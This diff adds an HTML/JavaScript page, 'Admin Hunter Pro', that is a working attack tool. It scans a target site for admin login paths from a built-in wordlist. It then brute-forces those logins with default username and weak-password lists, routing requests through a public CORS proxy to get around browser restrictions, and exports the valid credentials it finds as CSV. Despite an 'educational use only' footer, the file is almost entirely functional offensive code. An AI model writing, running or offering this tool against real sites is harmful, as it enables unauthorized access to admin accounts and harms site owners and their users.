@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Admin Hunter Pro · Scanner + Credential Finder</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+      min-height: 100vh;
+      padding: 2rem 1.5rem;
+    }
+
+    .scanner-container {
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    .hero {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+
+    .hero h1 {
+      font-size: 2.5rem;
+      font-weight: 700;
+      background: linear-gradient(135deg, #C084FC, #60A5FA, #34D399);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .hero h1::before {
+      content: "🛡️";
+      font-size: 2rem;
+      background: none;
+      color: #c084fc;
+    }
+
+    .sub {
+      color: #94a3b8;
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+    }
+
+    .card {
+      background: rgba(18, 25, 45, 0.75);
+      backdrop-filter: blur(12px);
+      border-radius: 2rem;
+      border: 1px solid rgba(72, 110, 160, 0.25);
+      box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.5);
+      padding: 1.8rem;
+      margin-bottom: 2rem;
+      transition: all 0.2s ease;
+    }
+
+    .card-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #e2e8f0;
+      margin-bottom: 1.25rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border-left: 4px solid #60a5fa;
+      padding-left: 16px;
+    }
+
+    .flex-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin-bottom: 1.2rem;
+      align-items: flex-end;
+    }
+
+    .input-wrapper {
+      flex: 1;
+      min-width: 180px;
+    }
+
+    .input-wrapper label {
+      display: block;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-weight: 500;
+      color: #8ba3cb;
+      margin-bottom: 6px;
+    }
+
+    input, textarea, select {
+      width: 100%;
+      background: #0f1629;
+      border: 1px solid #2a385c;
+      border-radius: 1rem;
+      padding: 0.8rem 1rem;
+      color: #f1f5f9;
+      font-size: 0.9rem;
+      transition: 0.2s;
+      outline: none;
+    }
+
+    input:focus, textarea:focus, select:focus {
+      border-color: #60a5fa;
+      box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.2);
+    }
+
+    button {
+      background: #1e2a47;
+      border: none;
+      padding: 0.75rem 1.6rem;
+      border-radius: 2rem;
+      font-weight: 600;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      color: #e2e8f0;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    button.primary {
+      background: linear-gradient(105deg, #3b82f6, #8b5cf6);
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+    }
+
+    button.primary:hover {
+      transform: translateY(-2px);
+      filter: brightness(1.05);
+    }
+
+    button.danger {
+      background: #4a2f3d;
+    }
+    button.danger:hover { background: #7f1a1a; }
+    button.warning {
+      background: #2f2a3e;
+      border: 1px solid #f59e0b50;
+    }
+
+    .results-wrapper {
+      overflow-x: auto;
+      border-radius: 1.5rem;
+      margin-top: 1rem;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.85rem;
+    }
+
+    th {
+      text-align: left;
+      padding: 1rem 0.8rem;
+      background: #0c1222cc;
+      color: #b9c7e0;
+    }
+
+    td {
+      padding: 0.8rem 0.8rem;
+      border-bottom: 1px solid #1e2a4a;
+      color: #cbd5e6;
+    }
+
+    .status-badge {
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 30px;
+      font-weight: 600;
+      font-size: 0.7rem;
+    }
+    .success-badge { background: #15803d30; color: #86efac; border-left: 2px solid #22c55e; }
+    .fail-badge { background: #7f1a1a30; color: #fca5a5; }
+    .progress-bar-bg {
+      background: #1e2a3e;
+      border-radius: 30px;
+      height: 8px;
+      overflow: hidden;
+      margin: 10px 0;
+    }
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #38bdf8, #a78bfa);
+      transition: width 0.2s;
+    }
+    .url-selector {
+      background: #0f1629;
+      border-radius: 1rem;
+      padding: 0.5rem;
+    }
+    .flex-between {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .footer-note {
+      text-align: center;
+      font-size: 0.7rem;
+      color: #4b5b7c;
+      margin-top: 1.5rem;
+    }
+    @media (max-width: 700px) {
+      body { padding: 1rem; }
+      .card { padding: 1.2rem; }
+    }
+  </style>
+</head>
+<body>
+<div class="scanner-container">
+  <div class="hero">
+    <h1>Admin Hunter Pro</h1>
+    <div class="sub">🔎 Scan admin panels + 🧪 Brute-force credentials (ethical use only)</div>
+  </div>
+
+  <!-- ========= SECTION 1: TARGET & PATH SCANNER ========= -->
+  <div class="card">
+    <div class="card-title"><span>🎯</span> 1. Discover admin login pages</div>
+    <div class="flex-group">
+      <div class="input-wrapper" style="flex:2">
+        <label>BASE URL</label>
+        <input type="text" id="targetUrl" placeholder="https://example.com" value="https://example.com">
+      </div>
+      <button id="scanBtn" class="primary">🚀 START SCAN</button>
+      <button id="stopScanBtn" class="danger">⏹️ STOP</button>
+    </div>
+    <div class="input-wrapper">
+      <label>📝 Admin paths (one per line)</label>
+      <textarea id="wordlistArea" rows="4" spellcheck="false"></textarea>
+      <div class="flex-between" style="margin-top: 8px;">
+        <button id="resetWordlistBtn" class="warning" style="padding:0.3rem 1rem;">⟳ Reset defaults</button>
+        <span style="font-size:0.7rem; color:#6c7ea0;">~ 30+ common admin paths</span>
+      </div>
+    </div>
+    <div class="progress-area">
+      <div class="flex-between"><span id="scanStatus">⚡ Ready</span><span id="scanCounter">0 / 0</span></div>
+      <div class="progress-bar-bg"><div class="progress-fill" id="progressFill"></div></div>
+    </div>
+    <div class="results-wrapper">
+      <table id="resultsTable">
+        <thead><tr><th>#</th><th>Admin URL</th><th>Status</th><th>Clue</th><th>Use for attack</th></tr></thead>
+        <tbody id="resultsBody"><tr><td colspan="5" style="text-align:center;">No scan yet. Enter URL and start.</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ========= SECTION 2: CREDENTIAL TESTER ========= -->
+  <div class="card">
+    <div class="card-title"><span>🔑</span> 2. Find admin username & password (credential tester)</div>
+    <div class="flex-group">
+      <div class="input-wrapper" style="flex:2">
+        <label>🎯 Target Login URL (full path, e.g., /admin/login)</label>
+        <div style="display:flex; gap:8px;">
+          <input type="text" id="loginUrl" placeholder="https://target.com/admin/login" value="">
+          <select id="savedUrlsList" style="width:auto; flex:0.5;">
+            <option value="">-- pick from scanned --</option>
+          </select>
+        </div>
+      </div>
+    </div>
+    <div class="flex-group">
+      <div class="input-wrapper">
+        <label>👤 Username field name</label>
+        <input type="text" id="usernameField" value="username" placeholder="username / email">
+      </div>
+      <div class="input-wrapper">
+        <label>🔒 Password field name</label>
+        <input type="text" id="passwordField" value="password" placeholder="password">
+      </div>
+      <div class="input-wrapper">
+        <label>✅ Success detection (text / redirect)</label>
+        <input type="text" id="successKeyword" value="dashboard, welcome, logout, admin" placeholder="comma separated keywords">
+      </div>
+    </div>
+    <div class="flex-group">
+      <div class="input-wrapper">
+        <label>📋 Username wordlist (one per line)</label>
+        <textarea id="usernameList" rows="3" spellcheck="false">admin
+administrator
+root
+user
+webadmin</textarea>
+      </div>
+      <div class="input-wrapper">
+        <label>🔑 Password wordlist (one per line)</label>
+        <textarea id="passwordList" rows="3" spellcheck="false">admin
+password123
+123456
+admin123
+root</textarea>
+      </div>
+    </div>
+    <div class="flex-between">
+      <div>
+        <button id="startAttackBtn" class="primary">⚡ START CREDENTIAL ATTACK</button>
+        <button id="stopAttackBtn" class="danger">⏹️ STOP ATTACK</button>
+        <button id="clearCredsBtn" class="warning">🗑️ Clear results</button>
+      </div>
+      <button id="exportCredsBtn" style="background:#1f2b42;">📎 Export CSV</button>
+    </div>
+    <div class="progress-area">
+      <div class="flex-between"><span id="attackStatus">💤 Idle</span><span id="attackCounter">0 / 0 attempts</span></div>
+      <div class="progress-bar-bg"><div class="progress-fill" id="attackProgressFill"></div></div>
+    </div>
+    <div class="results-wrapper">
+      <table id="credsTable">
+        <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Status / Response</th><th>Valid?</th></tr></thead>
+        <tbody id="credsBody"><tr><td colspan="5" style="text-align:center;">No credential test performed yet.</td></tr></tbody>
+      </table>
+    </div>
+  </div>
+  <div class="footer-note">
+    ⚠️ EDUCATIONAL USE ONLY. Only test systems you own or have explicit permission. Uses CORS proxy (corsproxy.io) to bypass restrictions.
+  </div>
+</div>
+
+<script>
+  // ------------------- GLOBALS -------------------
+  // SCANNER
+  let scanningActive = false;
+  let stopScanner = false;
+  let activeControllers = [];
+  let scannedResults = [];      // { url, status, clue }
+  let testedCount = 0, totalPaths = 0;
+  // ATTACKER
+  let attackActive = false;
+  let stopAttackFlag = false;
+  let attackControllers = [];
+  let credentialResults = [];   // { username, password, success, message }
+  let totalAttempts = 0, completedAttempts = 0;
+  let currentCombos = [];       // array of {username, password}
+  
+  // DOM elements scanner
+  const targetInput = document.getElementById('targetUrl');
+  const wordlistArea = document.getElementById('wordlistArea');
+  const scanBtn = document.getElementById('scanBtn');
+  const stopScanBtn = document.getElementById('stopScanBtn');
+  const resultsBody = document.getElementById('resultsBody');
+  const scanStatusSpan = document.getElementById('scanStatus');
+  const scanCounterSpan = document.getElementById('scanCounter');
+  const progressFill = document.getElementById('progressFill');
+  const resetWordlistBtn = document.getElementById('resetWordlistBtn');
+  // DOM elements attacker
+  const loginUrlInput = document.getElementById('loginUrl');
+  const savedUrlsSelect = document.getElementById('savedUrlsList');
+  const usernameFieldInput = document.getElementById('usernameField');
+  const passwordFieldInput = document.getElementById('passwordField');
+  const successKeywordInput = document.getElementById('successKeyword');
+  const usernameListArea = document.getElementById('usernameList');
+  const passwordListArea = document.getElementById('passwordList');
+  const startAttackBtn = document.getElementById('startAttackBtn');
+  const stopAttackBtn = document.getElementById('stopAttackBtn');
+  const clearCredsBtn = document.getElementById('clearCredsBtn');
+  const exportCredsBtn = document.getElementById('exportCredsBtn');
+  const attackStatusSpan = document.getElementById('attackStatus');
+  const attackCounterSpan = document.getElementById('attackCounter');
+  const attackProgressFill = document.getElementById('attackProgressFill');
+  const credsBody = document.getElementById('credsBody');
+
+  // ---------- DEFAULT PATHS ----------
+  const DEFAULT_PATHS = [
+    "admin", "login", "administrator", "admin/login", "adminpanel", "wp-admin", "admin.php",
+    "dashboard", "cpanel", "admincp", "moderator", "webadmin", "user/login", "auth",
+    "admin_area", "panel-admin", "backend", "controlpanel", "sysadmin", "siteadmin", "manage",
+    "admin/index.html", "admin/dashboard", "staff", "operator", "admin-login", "login/admin",
+    "account/login", "cp", "console", "manager", "administration", "adminer"
+  ];
+
+  function resetWordlist() { wordlistArea.value = DEFAULT_PATHS.join('\n'); }
+  resetWordlist();
+
+  // Helper: update scanner UI
+  function updateScannerProgress() {
+    if (totalPaths === 0) { progressFill.style.width = '0%'; scanCounterSpan.innerText = `0 / 0`; return; }
+    const percent = (testedCount / totalPaths) * 100;
+    progressFill.style.width = `${percent}%`;
+    scanCounterSpan.innerText = `${testedCount} / ${totalPaths}`;
+  }
+
+  // Render scanned admin URLs table
+  function renderScannedTable() {
+    if (scannedResults.length === 0) {
+      resultsBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">🔍 No results. Start scan.</td></tr>`;
+      return;
+    }
+    let html = '';
+    scannedResults.forEach((res, idx) => {
+      let clueBadge = res.clue ? `<span class="status-badge" style="background:#2d3748;">${res.clue}</span>` : '—';
+      let statusClass = res.status === 200 ? '✅' : (res.status === 403 ? '🚫' : (res.status === 401 ? '🔒' : res.status));
+      html += `<tr>
+        <td>${idx+1}</td>
+        <td><a href="${res.url}" target="_blank" style="color:#93c5fd;">${res.url.length > 60 ? res.url.slice(0,60)+'...' : res.url}</a></td>
+        <td>${statusClass} ${res.status}</td>
+        <td>${clueBadge}</td>
+        <td><button class="useUrlBtn" data-url="${res.url}" style="background:#3b82f6; padding:4px 12px; font-size:0.7rem;">🔑 Use for attack</button></td>
+      </tr>`;
+    });
+    resultsBody.innerHTML = html;
+    // attach event listeners to "Use for attack" buttons
+    document.querySelectorAll('.useUrlBtn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        const url = btn.getAttribute('data-url');
+        loginUrlInput.value = url;
+        updateSavedUrlsDropdown();
+      });
+    });
+  }
+
+  // update dropdown from scanned results
+  function updateSavedUrlsDropdown() {
+    let options = '<option value="">-- pick from scanned --</option>';
+    scannedResults.forEach(res => {
+      options += `<option value="${res.url}">${res.url.length > 50 ? res.url.slice(0,50)+'...' : res.url}</option>`;
+    });
+    savedUrlsSelect.innerHTML = options;
+    savedUrlsSelect.onchange = () => { if(savedUrlsSelect.value) loginUrlInput.value = savedUrlsSelect.value; };
+  }
+
+  // test single admin path via proxy
+  async function testPath(baseUrl, path, controllerSignal) {
+    let cleanBase = baseUrl.trim().replace(/\/$/, '');
+    if (!cleanBase.startsWith('http')) cleanBase = 'https://' + cleanBase;
+    let cleanPath = path.trim();
+    if (!cleanPath.startsWith('/')) cleanPath = '/' + cleanPath;
+    const fullUrl = cleanBase + cleanPath;
+    const proxyUrl = `https://corsproxy.io/?url=${encodeURIComponent(fullUrl)}`;
+    const abortCtrl = new AbortController();
+    const timeoutId = setTimeout(() => abortCtrl.abort(), 8000);
+    if (controllerSignal) controllerSignal.addEventListener('abort', () => abortCtrl.abort());
+    try {
+      const resp = await fetch(proxyUrl, { method: 'GET', signal: abortCtrl.signal, credentials: 'omit' });
+      clearTimeout(timeoutId);
+      let clue = '';
+      if (resp.status === 200) clue = '✅ Accessible (potential admin)';
+      else if (resp.status === 401) clue = '🔒 Auth required (admin zone)';
+      else if (resp.status === 403) clue = '🚫 Forbidden (restricted)';
+      else if (resp.status === 302) clue = '↪️ Redirect (may lead to login)';
+      else clue = `HTTP ${resp.status}`;
+      if (resp.status === 200 && (fullUrl.includes('admin') || fullUrl.includes('login'))) clue += ' ⭐ candidate';
+      return { url: fullUrl, status: resp.status, clue: clue };
+    } catch(e) {
+      clearTimeout(timeoutId);
+      return { url: fullUrl, status: 0, clue: '❌ timeout/error' };
+    }
+  }
+
+  async function runScanner(baseUrl, paths) {
+    const concurrency = 4;
+    let index = 0;
+    const total = paths.length;
+    totalPaths = total;
+    testedCount = 0;
+    updateScannerProgress();
+    scanStatusSpan.innerText = `Scanning ${total} paths...`;
+    const results = [];
+    const workers = [];
+    const processWorker = async () => {
+      while (!stopScanner && index < total) {
+        const i = index++;
+        const p = paths[i];
+        if (!p.trim()) { testedCount++; updateScannerProgress(); continue; }
+        const controller = new AbortController();
+        activeControllers.push(controller);
+        try {
+          const res = await testPath(baseUrl, p, controller.signal);
+          results.push(res);
+          scannedResults = [...results];
+          renderScannedTable();
+          updateSavedUrlsDropdown();
+        } catch(err) {}
+        finally {
+          const idxCtrl = activeControllers.indexOf(controller);
+          if(idxCtrl !== -1) activeControllers.splice(idxCtrl,1);
+          testedCount++;
+          updateScannerProgress();
+        }
+      }
+    };
+    for(let i=0; i<concurrency; i++) workers.push(processWorker());
+    await Promise.all(workers);
+    if(stopScanner) scanStatusSpan.innerText = `⏸️ Stopped (${testedCount}/${totalPaths})`;
+    else scanStatusSpan.innerText = `✅ Scan complete — ${scannedResults.filter(r => r.status===200 || r.status===401 || r.status===403).length} admin candidates`;
+  }
+
+  async function startScan() {
+    if(scanningActive) { scanStatusSpan.innerText = "Already running"; return; }
+    stopScanner = false;
+    scanningActive = true;
+    activeControllers.forEach(ctrl => ctrl.abort());
+    activeControllers = [];
+    scannedResults = [];
+    testedCount = 0;
+    renderScannedTable();
+    let base = targetInput.value.trim();
+    if(!base) { scanStatusSpan.innerText = "Enter target URL"; scanningActive=false; return; }
+    const paths = wordlistArea.value.split(/\r?\n/).filter(l => l.trim().length>0);
+    if(paths.length === 0) { scanStatusSpan.innerText = "Wordlist empty"; scanningActive=false; return; }
+    scanBtn.disabled = true; stopScanBtn.disabled = false;
+    try {
+      await runScanner(base, paths);
+    } catch(e) { console.error(e); scanStatusSpan.innerText = "Scan error"; }
+    finally { scanningActive=false; scanBtn.disabled=false; stopScanBtn.disabled=true; stopScanner=false; }
+  }
+
+  function stopScan() {
+    if(!scanningActive) return;
+    stopScanner = true;
+    scanningActive = false;
+    activeControllers.forEach(ctrl => ctrl.abort());
+    activeControllers = [];
+    scanStatusSpan.innerText = "Stopping...";
+    scanBtn.disabled = false;
+    stopScanBtn.disabled = true;
+  }
+
+  // ------------------- CREDENTIAL ATTACKER -------------------
+  function buildCombos(usernames, passwords) {
+    const combos = [];
+    for(let u of usernames) {
+      if(!u.trim()) continue;
+      for(let p of passwords) {
+        combos.push({ username: u.trim(), password: p.trim() });
+      }
+    }
+    return combos;
+  }
+
+  async function testLogin(loginUrl, username, password, usernameField, passwordField, successKeywords) {
+    const proxyUrl = `https://corsproxy.io/?url=${encodeURIComponent(loginUrl)}`;
+    const formData = new URLSearchParams();
+    formData.append(usernameField, username);
+    formData.append(passwordField, password);
+    const abortCtrl = new AbortController();
+    const timeoutId = setTimeout(() => abortCtrl.abort(), 10000);
+    attackControllers.push(abortCtrl);
+    try {
+      const response = await fetch(proxyUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: formData.toString(),
+        signal: abortCtrl.signal,
+        credentials: 'omit',
+        redirect: 'manual'   // manual to detect redirects
+      });
+      clearTimeout(timeoutId);
+      let success = false;
+      let message = '';
+      // check redirect (location header)
+      const location = response.headers.get('location');
+      let bodyText = '';
+      if(response.status === 200 || response.status === 302 || response.status === 301) {
+        if(location && (location.includes('dashboard') || location.includes('admin') || location.includes('home'))) success = true;
+        else {
+          // fetch body for keyword detection
+          const text = await response.text();
+          bodyText = text.toLowerCase();
+          const keywords = successKeywords.split(',').map(k => k.trim().toLowerCase());
+          if(keywords.some(kw => bodyText.includes(kw))) success = true;
+          else if(bodyText.includes('invalid') || bodyText.includes('error') || bodyText.includes('failed')) success = false;
+          else if(response.status === 200 && !bodyText.includes('login')) success = true; // maybe successful
+        }
+      }
+      if(response.status === 302 && !success && location && !location.includes('login')) success = true;
+      message = success ? '✅ SUCCESS - valid credentials!' : `❌ Failed (${response.status})`;
+      if(success && location) message += ` redirect → ${location.slice(0,50)}`;
+      return { success, message, status: response.status };
+    } catch(err) {
+      clearTimeout(timeoutId);
+      let msg = err.name === 'AbortError' ? 'Timeout' : 'Network error';
+      return { success: false, message: `⚠️ ${msg}`, status: 0 };
+    } finally {
+      const idx = attackControllers.indexOf(abortCtrl);
+      if(idx !== -1) attackControllers.splice(idx,1);
+    }
+  }
+
+  async function runCredentialAttack() {
+    let loginUrl = loginUrlInput.value.trim();
+    if(!loginUrl) { attackStatusSpan.innerText = "❌ No target login URL"; return; }
+    const usernameField = usernameFieldInput.value.trim() || "username";
+    const passwordField = passwordFieldInput.value.trim() || "password";
+    const successKeywordsRaw = successKeywordInput.value.trim() || "dashboard,welcome,logout,admin";
+    const keywords = successKeywordsRaw.split(',').map(s=>s.trim());
+    const usernames = usernameListArea.value.split(/\r?\n/).filter(l=>l.trim().length>0);
+    const passwords = passwordListArea.value.split(/\r?\n/).filter(l=>l.trim().length>0);
+    if(usernames.length===0 || passwords.length===0) { attackStatusSpan.innerText = "Add usernames & passwords"; return; }
+    const combos = buildCombos(usernames, passwords);
+    totalAttempts = combos.length;
+    completedAttempts = 0;
+    credentialResults = [];
+    renderCredsTable();
+    updateAttackProgress();
+    attackStatusSpan.innerText = `🚀 Testing ${totalAttempts} combinations...`;
+    stopAttackFlag = false;
+    attackActive = true;
+    startAttackBtn.disabled = true; stopAttackBtn.disabled = false;
+    
+    const concurrency = 3;
+    let index = 0;
+    const workers = [];
+    const process = async () => {
+      while(!stopAttackFlag && index < combos.length) {
+        const idx = index++;
+        const { username, password } = combos[idx];
+        const result = await testLogin(loginUrl, username, password, usernameField, passwordField, keywords);
+        credentialResults.push({
+          username, password,
+          success: result.success,
+          message: result.message
+        });
+        completedAttempts++;
+        updateAttackProgress();
+        renderCredsTable();
+      }
+    };
+    for(let i=0; i<concurrency; i++) workers.push(process());
+    await Promise.all(workers);
+    attackActive = false;
+    startAttackBtn.disabled = false; stopAttackBtn.disabled = true;
+    if(stopAttackFlag) attackStatusSpan.innerText = `⏸️ Attack stopped (${completedAttempts}/${totalAttempts})`;
+    else attackStatusSpan.innerText = `✅ Attack finished. Found ${credentialResults.filter(r=>r.success).length} valid credentials.`;
+  }
+
+  function updateAttackProgress() {
+    if(totalAttempts===0) { attackProgressFill.style.width='0%'; attackCounterSpan.innerText='0 / 0'; return; }
+    const percent = (completedAttempts/totalAttempts)*100;
+    attackProgressFill.style.width = `${percent}%`;
+    attackCounterSpan.innerText = `${completedAttempts} / ${totalAttempts}`;
+  }
+
+  function renderCredsTable() {
+    if(credentialResults.length===0) {
+      credsBody.innerHTML = `<tr><td colspan="5" style="text-align:center;">💤 No credential attempts yet.</td></tr>`;
+      return;
+    }
+    let html = '';
+    credentialResults.forEach((res, idx) => {
+      const badgeClass = res.success ? 'success-badge' : 'fail-badge';
+      const validText = res.success ? '✅ VALID' : '❌ Invalid';
+      html += `<tr>
+        <td>${idx+1}</td>
+        <td>${escapeHtml(res.username)}</td>
+        <td>${escapeHtml(res.password)}</td>
+        <td>${escapeHtml(res.message)}</td>
+        <td><span class="status-badge ${badgeClass}">${validText}</span></td>
+      </tr>`;
+    });
+    credsBody.innerHTML = html;
+  }
+  function escapeHtml(str) { return str.replace(/[&<>]/g, function(m){if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
+
+  function stopAttack() {
+    if(!attackActive) return;
+    stopAttackFlag = true;
+    attackActive = false;
+    attackControllers.forEach(ctrl => ctrl.abort());
+    attackControllers = [];
+    attackStatusSpan.innerText = "Stopping attack...";
+    startAttackBtn.disabled = false;
+    stopAttackBtn.disabled = true;
+  }
+
+  function clearCredResults() {
+    if(attackActive) stopAttack();
+    credentialResults = [];
+    totalAttempts = 0; completedAttempts = 0;
+    renderCredsTable();
+    updateAttackProgress();
+    attackStatusSpan.innerText = "Cleared.";
+  }
+
+  function exportCredsCSV() {
+    if(credentialResults.length===0) { alert("No credential data to export"); return; }
+    let rows = [["Username","Password","Success","Message"]];
+    credentialResults.forEach(r => {
+      rows.push([r.username, r.password, r.success ? "YES" : "NO", r.message]);
+    });
+    const csv = rows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(",")).join("\n");
+    const blob = new Blob([csv], {type:"text/csv"});
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = `credential_attack_${new Date().toISOString().slice(0,19)}.csv`;
+    link.click();
+    URL.revokeObjectURL(link.href);
+  }
+
+  // EVENT LISTENERS
+  scanBtn.addEventListener('click', startScan);
+  stopScanBtn.addEventListener('click', stopScan);
+  resetWordlistBtn.addEventListener('click', resetWordlist);
+  startAttackBtn.addEventListener('click', runCredentialAttack);
+  stopAttackBtn.addEventListener('click', stopAttack);
+  clearCredsBtn.addEventListener('click', clearCredResults);
+  exportCredsBtn.addEventListener('click', exportCredsCSV);
+  stopScanBtn.disabled = true;
+  stopAttackBtn.disabled = true;
+  updateSavedUrlsDropdown();
+</script>
+</body>
+</html>
